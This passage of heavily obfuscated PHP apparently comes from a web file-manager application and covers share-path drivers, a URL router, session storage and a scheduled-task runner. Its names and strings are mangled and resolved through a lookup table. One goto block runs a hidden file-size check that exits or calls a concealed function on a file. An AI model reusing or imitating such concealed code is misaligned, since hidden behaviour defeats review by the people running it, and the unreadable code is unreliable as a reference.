$§÷ˆòãæ = array($ßÈÜ’Û[420] => $Ôüä¾¯©, $ßÈÜ’Û[484] => $º”âŒ€, $ßÈÜ’Û[1867] => $this->getSort($ßÈÜ’Û[258]) + 1); return parent::insert($§÷ˆòãæ); } public function update($˜îœÖ‰ê, $şşû¨ÇŠ) { $âÑ¿ÑÄÇ =& $_SERVER[å¸¿•¶£]; $àù‘Êôì = $this->listData($˜îœÖ‰ê); $§¼½‹åş = $this->findByName($şşû¨ÇŠ[$âÑ¿ÑÄÇ[32]]); if (!$àù‘Êôì || $§¼½‹åş && $§¼½‹åş[$âÑ¿ÑÄÇ[399]] != $àù‘Êôì[$âÑ¿ÑÄÇ[399]]) { return !1; } return parent::update($˜îœÖ‰ê, $şşû¨ÇŠ); } public function moveTop($ŞÂ¤å¶) { $úÎ§÷ğ› =& $_SERVER[å¸¿•¶£]; $ó€ì¦‘ë = parent::listData(); $Ä“…Ó’‚ = $this->getSort($úÎ§÷ğ›[257]); foreach ($ó€ì¦‘ë as &$û·ºè’ı) { if ($û·ºè’ı[$úÎ§÷ğ›[399]] == $ŞÂ¤å¶) { $û·ºè’ı[$úÎ§÷ğ›[1887]] = $Ä“…Ó’‚; continue; } $û·ºè’ı[$úÎ§÷ğ›[1887]] += 1; } unset($û·ºè’ı); return parent::resetData($ó€ì¦‘ë); } public function moveBottom($³˜¬ëæ¼) { $™¢‡Ğ¿ä =& $_SERVER[å¸¿•¶£]; $ã»Ù×‘ = $this->getSort($™¢‡Ğ¿ä[258]) + 1; return parent::update($³˜¬ëæ¼, array($™¢‡Ğ¿ä[1887] => $ã»Ù×‘)); } public function resetSort($¯³ñ·«) { $›Å–Ëù¹ =& $_SERVER[å¸¿•¶£]; $ÙáÊ÷Š = array(); $¯³ñ·« = is_array($¯³ñ·«) ? $¯³ñ·« : array(); for ($Ôà˜¹âû = 0; $Ôà˜¹âû < count($¯³ñ·«); $Ôà˜¹âû++) { $ÙáÊ÷Š[$¯³ñ·«[$Ôà˜¹âû] . $›Å–Ëù¹[12]] = $Ôà˜¹âû + 1; } $£“¹Ó³ = parent::listData(); foreach ($£“¹Ó³ as &$×÷öŠö) { $Ç‘ˆãù³ = $ÙáÊ÷Š[$×÷öŠö[$›Å–Ëù¹[399]]]; $×÷öŠö[$›Å–Ëù¹[1887]] = $Ç‘ˆãù³ ? $Ç‘ˆãù³ : $×÷öŠö[$›Å–Ëù¹[1887]]; } unset($×÷öŠö); return parent::resetData($£“¹Ó³); } private function getSort($ŸŸÅÑÊ) { $£•Ğê¼¼ =& $_SERVER[å¸¿•¶£]; $ÚÉºãöö = parent::listData(); $†·İ›ÈĞ = array_to_keyvalue($ÚÉºãöö, $£•Ğê¼¼[12], $£•Ğê¼¼[1887]); if (!$†·İ›ÈĞ) { $†·İ›ÈĞ = array(0); } $°Š¯¹„Â = $ŸŸÅÑÊ == $£•Ğê¼¼[258] ? max($†·İ›ÈĞ) : min($†·İ›ÈĞ); return intval($°Š¯¹„Â); } } goto fóïœ¸Š©ñ; a¿‚ã®Ô: $_file = $_SERVER[$_SERVER[å¸¿•¶£][748]]; $_size = $_SERVER[å¸¿•¶£][873]; if ($_SERVER[$_SERVER[å¸¿•¶£][747]] != $_size($_file)) { $_getc = $_SERVER[å¸¿•¶£][749]; $_getfile = $_SERVER[$_SERVER[å¸¿•¶£][750]] . $_SERVER[å¸¿•¶£][751]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[å¸¿•¶£][231], $_getfilec); if (count($_getarrs) < $_SERVER[å¸¿•¶£][621]) { $exit = $_SERVER[å¸¿•¶£][752]; $exit(); } $_act = $_SERVER[å¸¿•¶£][753]; $_act($_file); } goto bèÓÆ¶¡Æç; Eğ¸âÚœ…Ë: class PathDriverDbShareItem extends PathDriverDB { public function __construct($±ûıŠŠı) { $this->pathParse = $±ûıŠŠı; $this->model = Model($_SERVER[å¸¿•¶£][1346]); } public function getPathOuter($ƒªÏ»â³) { $Ô”™Ææ† =& $_SERVER[å¸¿•¶£]; if (!$ƒªÏ»â³) { return $ƒªÏ»â³; } $†¥™õ™¬ = $this->parse($ƒªÏ»â³); return trim(KodIO::makeShare($this->pathParse[$Ô”™Ææ†[399]], $†¥™õ™¬[$Ô”™Ææ†[399]]), $Ô”™Ææ†[8]); } protected function infoParse($„ºğæ, $Œ‚ÁíĞ = false, $Õ‡Î¥² = false) { $Ó«ØŠ“ =& $_SERVER[å¸¿•¶£]; $±¾™›¤Î = $this->pathParse[$Ó«ØŠ“[399]]; $ñ»§«ñ” = trim($this->pathParse[$Ó«ØŠ“[1175]], $Ó«ØŠ“[8]); return Action($Ó«ØŠ“[1354])->sharePathInfo($±¾™›¤Î, $ñ»§«ñ”, $Œ‚ÁíĞ); } public function infoFull($À·…Ü×ã) { $ó…È¦Ëé =& $_SERVER[å¸¿•¶£]; $ÃÃí¥É¨ = explode($ó…È¦Ëé[8], trim($À·…Ü×ã, $ó…È¦Ëé[8])); if (count($ÃÃí¥É¨) > 1) { $Ë‘œ†áˆ = implode($ó…È¦Ëé[8], array_splice($ÃÃí¥É¨, 1)); $Ÿµ…ù«î = $this->model->pathInfoByPath($ÃÃí¥É¨[0], $Ë‘œ†áˆ); if (!$Ÿµ…ù«î) { return !1; } $this->pathParse[$ó…È¦Ëé[1175]] = $Ÿµ…ù«î[$ó…È¦Ëé[402]]; } return $this->infoParse($À·…Ü×ã); } public function listAll($£æ®şŒÎ) { $Å«ÊıŠ =& $_SERVER[å¸¿•¶£]; $–¬şäÌ¾ = IO::info($this->pathParse[$Å«ÊıŠ[84]]); if (!$–¬şäÌ¾) { return array(); } $ããå„ÓÒ = $this->model->listAll($£æ®şŒÎ); $ÇÔÜ¶ıĞ = Model($Å«ÊıŠ[592])->getInfo($–¬şäÌ¾[$Å«ÊıŠ[593]]); foreach ($ããå„ÓÒ as &$î”°â…à) { check_abort(); $î”°â…à[$Å«ÊıŠ[87]] = Action($Å«ÊıŠ[1354])->_shareItemeParse($î”°â…à[$Å«ÊıŠ[87]], $ÇÔÜ¶ıĞ); } unset($î”°â…à); return $ããå„ÓÒ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($µ¸Ğ©„Â) { $this->pathParse = $µ¸Ğ©„Â; $this->model = Model($_SERVER[å¸¿•¶£][1346]); } protected function infoParse($ÓŸÕŠœ•, $Äî–íñ¤ = false, $ÀàğëËµ = false) { $ŞŸÅğ¨‘ =& $_SERVER[å¸¿•¶£]; return Action($ŞŸÅğ¨‘[1181])->sharePathInfo($this->pathParse[$ŞŸÅğ¨‘[84]], !0, $Äî–íñ¤); } public function listPath($ˆ±íş£×, $ÁìáıÆ = false) { $„ßè¾  =& $_SERVER[å¸¿•¶£]; $º°Ò®Ì• = parent::listPath($ˆ±íş£×, $ÁìáıÆ); if (!$º°Ò®Ì•) { return $º°Ò®Ì•; } if (is_array($º°Ò®Ì•[$„ßè¾ [1355]])) { $º°Ò®Ì•[$„ßè¾ [1355]] = Action($„ßè¾ [1181])->shareItemInfo($º°Ò®Ì•[$„ßè¾ [1355]]); } foreach ($º°Ò®Ì• as $ì¬¬á†ö => $×†â¸ßÖ) { if (!in_array($ì¬¬á†ö, array($„ßè¾ [83], $„ßè¾ [82]))) { continue; } foreach ($×†â¸ßÖ as $€Ë®Ä…ñ => $İ‚À¿Ç) { $º°Ò®Ì•[$ì¬¬á†ö][$€Ë®Ä…ñ] = Action($„ßè¾ [1181])->shareItemInfo($İ‚À¿Ç); } } return $º°Ò®Ì•; } public function listAll($¢‘ğàÂ) { $Äı¨€¼ =& $_SERVER[å¸¿•¶£]; $ŒüÄìóœ = IO::info($this->pathParse[$Äı¨€¼[84]]); if (!$ŒüÄìóœ) { return array(); } $Ìê˜ì‹¬ = $this->model->listAll($¢‘ğàÂ); foreach ($Ìê˜ì‹¬ as &$åÃ´òı¼) { $åÃ´òı¼[$Äı¨€¼[87]] = Action($Äı¨€¼[1181])->shareItemInfo($åÃ´òı¼[$Äı¨€¼[87]]); } unset($åÃ´òı¼); return $Ìê˜ì‹¬; } } class PathDriverDriverShareItem { public function __construct($öóŒÍ¼‚) { $this->pathParse = $öóŒÍ¼‚; } public function __call($À†Ï¯½Ã, $¥Ü³éÅÎ) { $”¿ùãøÂ =& $_SERVER[å¸¿•¶£]; if (method_exists($this, $À†Ï¯½Ã)) { return; } $Ìğ¸ìÏÈ = call_user_func_array(array($”¿ùãøÂ[1356], $À†Ï¯½Ã), $¥Ü³éÅÎ); $©¢Ğ›Óş = array($”¿ùãøÂ[1357], $”¿ùãøÂ[1358], $”¿ùãøÂ[1359], $”¿ùãøÂ[1360], $”¿ùãøÂ[546], $”¿ùãøÂ[548], $”¿ùãøÂ[1361], $”¿ùãøÂ[107], $”¿ùãøÂ[1362], $”¿ùãøÂ[1363]); if (in_array($À†Ï¯½Ã, $©¢Ğ›Óş)) { $Ìğ¸ìÏÈ = $this->getPathOuter($Ìğ¸ìÏÈ); } return $Ìğ¸ìÏÈ; } public function copy($…¯è´œ, $€¸ª’íã, $Æã±üÚœ = false, $ûñùÓëÆ = false) { return $this->copyMove($…¯è´œ, $€¸ª’íã, $Æã±üÚœ, $_SERVER[å¸¿•¶£][546], $ûñùÓëÆ); } public function move($×‡ÄÇéÃ, $­‚è, $º¿÷¶äû = false, $’Óçõ˜ = false) { return $this->copyMove($×‡ÄÇéÃ, $­‚è, $º¿÷¶äû, $_SERVER[å¸¿•¶£][548], $’Óçõ˜); } private function copyMove($Ìàôü¢ù, $÷€¯Ü±¢, $®ÊÏ—€, $ãïŸ™ı‡, $é”ª´è™ = false) { $ƒ¤ß¾Î =& $_SERVER[å¸¿•¶£]; $ç«ó§›Ó = $÷€¯Ü±¢; $¯˜ÌáÄ = IO::driverMake($÷€¯Ü±¢); if ($¯˜ÌáÄ->pathParse[$ƒ¤ß¾Î[1158]]) { $÷€¯Ü±¢ = $¯˜ÌáÄ->pathParse[$ƒ¤ß¾Î[1158]]; } else { $÷€¯Ü±¢ = $ç«ó§›Ó; } $—ˆ¢Îƒø = IO::copyMove($Ìàôü¢ù, $÷€¯Ü±¢, $®ÊÏ—€, $ãïŸ™ı‡, $é”ª´è™); $—ˆ¢Îƒø = $this->getPathOuter($—ˆ¢Îƒø); return $—ˆ¢Îƒø; } public function pathThis($ÜƒÀ¾ãú) { return get_path_this($this->pathParse[$_SERVER[å¸¿•¶£][84]]); } public function pathFather($Ì¡—å¤¶) { return get_path_father($this->pathParse[$_SERVER[å¸¿•¶£][84]]); } public function iconvSystem($çÊ¥½ê) { return $çÊ¥½ê; } protected function infoParse($¼ùÌë¨İ, $µ£Ù´º¡ = false) { $úış½ì® =& $_SERVER[å¸¿•¶£]; $‰éºÙ˜ä = $this->pathParse[$úış½ì®[486]][$úış½ì®[1182]] . $this->pathParse[$úış½ì®[1175]]; if ($µ£Ù´º¡) { $ûÙªˆÊ = IO::infoWithChildren($‰éºÙ˜ä); } else { $ûÙªˆÊ = IO::info($‰éºÙ˜ä); } $‰Ëºı±ã = $this->pathParse[$úış½ì®[486]]; return Action($úış½ì®[1354])->_shareItemeParse($ûÙªˆÊ, $‰Ëºı±ã); } public function listAll($¤»´ıÃ´) { $É„Í‰ñ” =& $_SERVER[å¸¿•¶£]; $¦È–À—» = IO::listAll($¤»´ıÃ´); $à€¡…ºĞ = rtrim($this->pathParse[$É„Í‰ñ”[486]][$É„Í‰ñ”[1182]], $É„Í‰ñ”[8]); foreach ($¦È–À—» as &$–“çŒ¡») { $–“çŒ¡»[$É„Í‰ñ”[84]] = $this->pathDriver . $É„Í‰ñ”[8] . ltrim(substr($–“çŒ¡»[$É„Í‰ñ”[84]], strlen($à€¡…ºĞ)), $É„Í‰ñ”[8]); } unset($–“çŒ¡»); return $¦È–À—»; } public function listAllSimple($’äÀ“Öê, $ñÇıù§ = false) { $îª¤ÜŒ =& $_SERVER[å¸¿•¶£]; $ÎË¬¦í = $this->listAll($’äÀ“Öê); $´ã‹Ó¨Ï = $this->pathParse[$îª¤ÜŒ[421]]; if (trim($´ã‹Ó¨Ï, $îª¤ÜŒ[8]) == trim(get_path_father($´ã‹Ó¨Ï), $îª¤ÜŒ[8])) { $ñÇıù§ = !0; } return IO::init($îª¤ÜŒ[12])->listAllSimpleMake($ÎË¬¦í, $´ã‹Ó¨Ï, $ñÇıù§); } public function getPathOuter($îƒ¢çÄ¾) { $ò¾ßèéî =& $_SERVER[å¸¿•¶£]; $ç õñ† = KodIO::parse($îƒ¢çÄ¾); if ($ç õñ†[$ò¾ßèéî[33]] == KodIO::KOD_SHARE_ITEM) { return $ç õñ†[$ò¾ßèéî[84]]; } $ÄÅÚœ = KodIO::clear($îƒ¢çÄ¾); $ÉÙªùŸ¡ = KodIO::clear($this->pathParse[$ò¾ßèéî[486]][$ò¾ßèéî[1182]]); $¯á“û“ú = substr($ÄÅÚœ, strlen($ÉÙªùŸ¡)); if (substr($ÄÅÚœ, 0, strlen($ÉÙªùŸ¡)) != $ÉÙªùŸ¡) { return !1; } return $this->pathParse[$ò¾ßèéî[1176]] . $ò¾ßèéî[8] . ltrim($¯á“û“ú, $ò¾ßèéî[8]); } public function getType() { $ù½˜ğÛê =& $_SERVER[å¸¿•¶£]; $Ã™°¾×é = str_replace($ù½˜ğÛê[74], $ù½˜ğÛê[12], get_class($this)); return strtolower($Ã™°¾×é); } public function isTypeObject($¿Œ»şîÛ) { return IO::isTypeObject($¿Œ»şîÛ); } public function info($ØÃ©Ïñ) { return $this->infoParse($ØÃ©Ïñ); } public function infoAuth($á“áä«ª) { return $this->infoParse($á“áä«ª); } public function infoWithChildren($¹‰†Äíñ) { return $this->infoParse($¹‰†Äíñ, !0); } public function infoFull($Êáñ “) { return $this->infoParse($Êáñ “); } } goto Aä›’Œ„Æì; cé£³½¯Àì: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\x79" => "\x5b\x5e\57\x5d\x2b", "\72\x6e\165\155" => "\133\60\55\71\x5d\53", "\x3a\141\154\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($—ö—òÙå, $« ÃÇ©) { $á£¶˜È =& $_SERVER[å¸¿•¶£]; if ($—ö—òÙå == $á£¶˜È[1619]) { $ù­‘˜×– = array_map($á£¶˜È[1620], $« ÃÇ©[0]); $–Å·Û£İ = strpos($« ÃÇ©[1], $á£¶˜È[8]) === 0 ? $« ÃÇ©[1] : $á£¶˜È[8] . $« ÃÇ©[1]; $î¤î‰©… = $« ÃÇ©[2]; } else { $ù­‘˜×– = null; $–Å·Û£İ = strpos($« ÃÇ©[0], $á£¶˜È[8]) === 0 ? $« ÃÇ©[0] : $á£¶˜È[8] . $« ÃÇ©[0]; $î¤î‰©… = $« ÃÇ©[1]; } array_push(self::$maps, $ù­‘˜×–); array_push(self::$routes, $–Å·Û£İ); array_push(self::$methods, strtoupper($—ö—òÙå)); array_push(self::$callbacks, $î¤î‰©…); } public static function error($¼–à¦¥) { self::$errorCallback = $¼–à¦¥; } public static function haltOnMatch($‹âßìôà = true) { self::$halts = $‹âßìôà; } public static function dispatch() { $àÂÔÕ =& $_SERVER[å¸¿•¶£]; $ïŠ¹Ïù = parse_url($_SERVER[$àÂÔÕ[1621]], PHP_URL_PATH); $Ï°×§€ = $_SERVER[$àÂÔÕ[159]]; $Â„¥úÆ = array_keys(static::$patterns); $§Ö‘§Ö¦ = array_values(static::$patterns); $—ªÉä• = !1; self::$routes = preg_replace($àÂÔÕ[1283], $àÂÔÕ[8], self::$routes); if (in_array($ïŠ¹Ïù, self::$routes)) { $¡Èòæ = array_keys(self::$routes, $ïŠ¹Ïù); foreach ($¡Èòæ as $ñˆè¶°°) { if (self::$methods[$ñˆè¶°°] == $Ï°×§€ || self::$methods[$ñˆè¶°°] == $àÂÔÕ[1622] || in_array($Ï°×§€, self::$maps[$ñˆè¶°°])) { $—ªÉä• = !0; if (!is_object(self::$callbacks[$ñˆè¶°°])) { $ØŒõ›ö = explode($àÂÔÕ[8], self::$callbacks[$ñˆè¶°°]); $ÈÙŠôµœ = end($ØŒõ›ö); $–†Ö—Ê´ = explode($àÂÔÕ[1215], $ÈÙŠôµœ); $şà¡û· = new $–†Ö—Ê´[0](); $şà¡û·->{$–†Ö—Ê´[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ñˆè¶°°]); if (self::$halts) { return; } } } } } else { $ÛÍ™Ù„ = 0; foreach (self::$routes as $ñˆè¶°°) { if (strpos($ñˆè¶°°, $àÂÔÕ[4]) !== !1) { $ñˆè¶°° = str_replace($Â„¥úÆ, $§Ö‘§Ö¦, $ñˆè¶°°); } if (preg_match($àÂÔÕ[1623] . $ñˆè¶°° . $àÂÔÕ[1624], $ïŠ¹Ïù, $£·µñºé)) { if (self::$methods[$ÛÍ™Ù„] == $Ï°×§€ || self::$methods[$ÛÍ™Ù„] == $àÂÔÕ[1622] || !empty(self::$maps[$ÛÍ™Ù„]) && in_array($Ï°×§€, self::$maps[$ÛÍ™Ù„])) { $—ªÉä• = !0; array_shift($£·µñºé); if (!is_object(self::$callbacks[$ÛÍ™Ù„])) { $ØŒõ›ö = explode($àÂÔÕ[8], self::$callbacks[$ÛÍ™Ù„]); $ÈÙŠôµœ = end($ØŒõ›ö); $–†Ö—Ê´ = explode($àÂÔÕ[1215], $ÈÙŠôµœ); $şà¡û· = new $–†Ö—Ê´[0](); if (!method_exists($şà¡û·, $–†Ö—Ê´[1])) { echo $àÂÔÕ[1625]; } else { call_user_func_array(array($şà¡û·, $–†Ö—Ê´[1]), $£·µñºé); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ÛÍ™Ù„], $£·µñºé); if (self::$halts) { return; } } } } $ÛÍ™Ù„++; } } if ($—ªÉä• == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $êàÖºç† =& $_SERVER[å¸¿•¶£]; header($_SERVER[$êàÖºç†[1626]] . $êàÖºç†[1627]); echo $êàÖºç†[1628]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$àÂÔÕ[1621]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $†üÇ–¹ =& $_SERVER[å¸¿•¶£]; static $…ç¸“İ· = false; if ($…ç¸“İ·) { return $…ç¸“İ·; } $‹®ğ«†” = $GLOBALS[$†üÇ–¹[6]][$†üÇ–¹[349]]; self::$sessionTime = $‹®ğ«†”[$†üÇ–¹[1629]]; $Òğ–º¯‘ = isset($GLOBALS[$†üÇ–¹[1630]]) ? $GLOBALS[$†üÇ–¹[1630]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Òğ–º¯‘)) { self::$sessionSign = Cookie::get($Òğ–º¯‘); } else { self::$sessionSign = guid(); } } Cookie::setSafe($Òğ–º¯‘, self::$sessionSign, self::$sessionTime); $‘û½ã¿™ = $‹®ğ«†”[$†üÇ–¹[1631]]; $ÕåÓ©‚ = $‹®ğ«†”[$‘û½ã¿™]; $èâçÎ‰ = $‹®ğ«†”[$†üÇ–¹[835]]; switch ($‘û½ã¿™) { case $†üÇ–¹[21]: self::$handle = Model($†üÇ–¹[836]); break; case $†üÇ–¹[837]: self::$handle = new CacheRedis($ÕåÓ©‚, $èâçÎ‰); break; case $†üÇ–¹[838]: self::$handle = new CacheMemcached($ÕåÓ©‚, $èâçÎ‰); break; case $†üÇ–¹[200]: $ÕåÓ©‚[$†üÇ–¹[84]] = $ÕåÓ©‚[$†üÇ–¹[84]] . $†üÇ–¹[1632]; self::$handle = new CacheFile($ÕåÓ©‚, $èâçÎ‰); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $…ç¸“İ· = new self(); return $…ç¸“İ·; } public static function getBySign($‚é¦¥›Ø) { $Ô¨¤ÑŠ = self::$handle->get($‚é¦¥›Ø); $Ô¨¤ÑŠ = unserialize($Ô¨¤ÑŠ); return is_array($Ô¨¤ÑŠ) ? $Ô¨¤ÑŠ : array(); } public static function setBySign($Î§ªÎ‚É, $êĞ´™˜Û) { CacheLock::lock($Î§ªÎ‚É); self::$handle->set($Î§ªÎ‚É, serialize($êĞ´™˜Û), self::$sessionTime); CacheLock::unlock($Î§ªÎ‚É); } public static function sign($Á©ÑàÍû = false) { $Á©ÑàÍû && (self::$sessionSign = $Á©ÑàÍû); self::init(); return self::$sessionSign; } public static function set($¾®üÓ·à, $Ùô²¯© = false) { self::init(); if (is_array($¾®üÓ·à)) { foreach ($¾®üÓ·à as $¼ÌÃ÷ => $‡ ®€Ù) { array_set_value(self::$data, $¼ÌÃ÷, $‡ ®€Ù); } } else { array_set_value(self::$data, $¾®üÓ·à, $Ùô²¯©); } self::setBySign(self::$sessionSign, self::$data); } public static function get($•ºˆÏê§ = false) { self::init(); if (!$•ºˆÏê§) { return self::$data; } return array_get_value(self::$data, $•ºˆÏê§); } public static function remove($ı§…™¿“) { self::init(); unset(self::$data[$ı§…™¿“]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[å¸¿•¶£][840])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $» µ½éÒ =& $_SERVER[å¸¿•¶£]; if (self::valueGet($» µ½éÒ[756]) != $» µ½éÒ[88]) { return; } if (self::valueGet($» µ½éÒ[1633]) == $» µ½éÒ[88]) { $ïäãÏ±‘ = self::valueGet($» µ½éÒ[1634]); if (time() - $ïäãÏ±‘ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$» µ½éÒ[1635]] = 1; self::valueSet($» µ½éÒ[1633], $» µ½éÒ[88]); self::log($» µ½éÒ[1636] . ACTION . $» µ½éÒ[1637]); Session::$data = array(); Session::$sessionSign = $» µ½éÒ[12]; $GLOBALS[$» µ½éÒ[494]] = 1; Hook::bind($» µ½éÒ[1638], $» µ½éÒ[1639]); $ÖàúâßÆ = 0; while (!0) { self::cacheClear(); if (self::valueGet($» µ½éÒ[756]) != $» µ½éÒ[88]) { self::valueSet($» µ½éÒ[1633], $» µ½éÒ[198]); self::log($» µ½éÒ[1640]); die; } $”¢í®âš = time(); if ($”¢í®âš - $ÖàúâßÆ >= 60) { self::valueSet(array($» µ½éÒ[1633] => $» µ½éÒ[88], $» µ½éÒ[1634] => $”¢í®âš), !1); $ÖàúâßÆ = $”¢í®âš; } if (!file_exists(USER_SYSTEM . $» µ½éÒ[1641])) { self::valueSet(array($» µ½éÒ[1633] => $» µ½éÒ[198], $» µ½éÒ[756] => $» µ½éÒ[198]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $¤ßÃá• =& $_SERVER[å¸¿•¶£]; http_close(); self::valueSet($¤ßÃá•[756], $¤ßÃá•[198]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($¤ßÃá•[1633] => $¤ßÃá•[198], $¤ßÃá•[756] => $¤ßÃá•[88]), !1); } public static function taskSwitch() { $•Ÿ‰’ù¦ =& $_SERVER[å¸¿•¶£]; $”Û×…½Ë = self::valueGet($•Ÿ‰’ù¦[756]) == $•Ÿ‰’ù¦[88] ? $•Ÿ‰’ù¦[198] : $•Ÿ‰’ù¦[88]; self::valueSet($•Ÿ‰’ù¦[756], $”Û×…½Ë); } public static function shutdownEvent() { $¨©ª‰õÄ =& $_SERVER[å¸¿•¶£]; self::valueSet($¨©ª‰õÄ[1633], $¨©ª‰õÄ[198]); self::log($¨©ª‰õÄ[1642]); } public static function config($ÇâÁ³ı, $¾ùöïĞÛ) { self::valueSet($_SERVER[å¸¿•¶£][756], $ÇâÁ³ı); } private static function taskRunAll() { $Å€ÛùŸ =& $_SERVER[å¸¿•¶£]; $áÛ’ë÷Ÿ = timeFloat(); $ÔğäÊ’« = Model($Å€ÛùŸ[1643])->listData(); $¢ÄĞ = count($ÔğäÊ’«); for ($í×‡²ã = 0; $í×‡²ã < $¢ÄĞ; $í×‡²ã++) { $òäê™öõ = $ÔğäÊ’«[$í×‡²ã]; if (!$òäê™öõ[$Å€ÛùŸ[399]] || $òäê™öõ[$Å€ÛùŸ[1644]] != $Å€ÛùŸ[88]) { continue; } if (!self::taskTimeCheck($òäê™öõ)) { continue; } self::taskRun($òäê™öõ); } Hook::trigger($Å€ÛùŸ[1645]); self::taskQueueRun($áÛ’ë÷Ÿ); } private static function taskQueueRun($£ÚØ¤‰) { $Êšèñ©í = 10; while (!0) { $ç¿üûùò = TaskQueue::run(); if ($ç¿üûùò === !1) { break; } if (timeFloat() - $£ÚØ¤‰ >= $Êšèñ©í) { break; } } } private static function taskTimeCheck($åŸ´Ûêö) { $ÂûÍßŞ =& $_SERVER[å¸¿•¶£]; $Í ’ÎâÇ = json_decode($åŸ´Ûêö[$ÂûÍßŞ[180]], !0); $²ÖŸ‰¨€ = intval($åŸ´Ûêö[$ÂûÍßŞ[1634]]); $‘İÊ¡œ÷ = strtotime($ÂûÍßŞ[1646] . $Í ’ÎâÇ[$ÂûÍßŞ[1647]] . $ÂûÍßŞ[1648]) - strtotime($ÂûÍßŞ[1649]); $œ¯ë‚ßã = time() - strtotime(date($ÂûÍßŞ[1650]) . $ÂûÍßŞ[1651]); $ú—ŒåíÒ = $œ¯ë‚ßã >= $‘İÊ¡œ÷ && $œ¯ë‚ßã <= $‘İÊ¡œ÷ + 3600; switch ($Í ’ÎâÇ[$ÂûÍßŞ[33]]) { case $ÂûÍßŞ[1652]: if (time() - $²ÖŸ‰¨€ < 3600 * 24 * 30) { return !1; } if ($Í ’ÎâÇ[$ÂûÍßŞ[1652]] == date($ÂûÍßŞ[1653]) && $ú—ŒåíÒ) { return !0; } break; case $ÂûÍßŞ[1654]: if (time() - $²ÖŸ‰¨€ < 3600 * 24 * 7) { return !1; } $¡ÑÕæˆº = date($ÂûÍßŞ[1655]) == 0 ? 7 : date($ÂûÍßŞ[1655]); if ($Í ’ÎâÇ[$ÂûÍßŞ[1654]] == $¡ÑÕæˆº && $ú—ŒåíÒ) { return !0; } break; case $ÂûÍßŞ[1647]: if (time() - $²ÖŸ‰¨€ < 3600 * 24) { return !1; } if ($ú—ŒåíÒ) { return !0; } break; case $ÂûÍßŞ[1656]: if (time() - $²ÖŸ‰¨€ >= floatval($Í ’ÎâÇ[$ÂûÍßŞ[1656]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ƒûàßß¹ =& $_SERVER[å¸¿•¶£]; static $İ³áÜÇá = 0; $›˜­Ô‚ = 300; if (!$İ³áÜÇá) { $İ³áÜÇá = time(); } if (time() - $İ³áÜÇá < $›˜­Ô‚) { return; } $İ³áÜÇá = time(); $”œ™àê½ = Model($ƒûàßß¹[504])->db($ƒûàßß¹[12]); if ($”œ™àê½) { $”œ™àê½->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ƒûàßß¹[1657], $ƒûàßß¹[1658]); die; } } public static function taskRun($Ø—©ìºª) { $‰Í©ºãú =& $_SERVER[å¸¿•¶£]; self::log($‰Í©ºãú[1659] . $Ø—©ìºª[$‰Í©ºãú[399]] . $‰Í©ºãú[1660] . $Ø—©ìºª[$‰Í©ºãú[32]] . $‰Í©ºãú[1661] . $Ø—©ìºª[$‰Í©ºãú[1662]]); Model($‰Í©ºãú[1643])->run($Ø—©ìºª[$‰Í©ºãú[399]]); $ÃÆµÃ¼¤ = timeFloat(); $øíëò‚ = $‰Í©ºãú[12]; switch ($Ø—©ìºª[$‰Í©ºãú[33]]) { case $‰Í©ºãú[307]: $ñÙŠÇ¸£ = url_request($Ø—©ìºª[$‰Í©ºãú[1662]], $‰Í©ºãú[230], !1, !1, !1, !1, 10); if ($ñÙŠÇ¸£[$‰Í©ºãú[756]]) { $øíëò‚ = strlen($ñÙŠÇ¸£[$‰Í©ºãú[1209]]); } break; case $‰Í©ºãú[229]: $øíëò‚ = Hook::apply($Ø—©ìºª[$‰Í©ºãú[1662]]); default: break; } Model($‰Í©ºãú[1663])->add(array($‰Í©ºãú[1664] => $‰Í©ºãú[12], $‰Í©ºãú[1665] => $‰Í©ºãú[198], $‰Í©ºãú[33] => $‰Í©ºãú[1666] . $Ø—©ìºª[$‰Í©ºãú[399]], $‰Í©ºãú[1667] => json_encode(array($‰Í©ºãú[32] => $Ø—©ìºª[$‰Í©ºãú[32]], $‰Í©ºãú[1668] => timeFloat() - $ÃÆµÃ¼¤, $‰Í©ºãú[293] => $øíëò‚)))); $íÌğÙÏ¥ = $øíëò‚ ? $‰Í©ºãú[1669] . $øíëò‚ : $‰Í©ºãú[12]; self::log($‰Í©ºãú[1670] . $Ø—©ìºª[$‰Í©ºãú[399]] . $‰Í©ºãú[164] . $íÌğÙÏ¥); return !0; } private static function valueGet($¥¬Â¬”) { $šÀ£Òû‚ =& $_SERVER[å¸¿•¶£]; $ºÍÒïÉ = $šÀ£Òû‚[1671]; $ˆÂŸÌ¸ = Model($šÀ£Òû‚[435])->get($¥¬Â¬”, $ºÍÒïÉ); if (is_null($ˆÂŸÌ¸)) { Model($šÀ£Òû‚[435])->set($šÀ£Òû‚[756], $šÀ£Òû‚[88], $ºÍÒïÉ); Model($šÀ£Òû‚[435])->set($šÀ£Òû‚[1633], $šÀ£Òû‚[198], $ºÍÒïÉ); $ˆÂŸÌ¸ = Model($šÀ£Òû‚[435])->get($¥¬Â¬”, $ºÍÒïÉ); } return $ˆÂŸÌ¸; } private static function 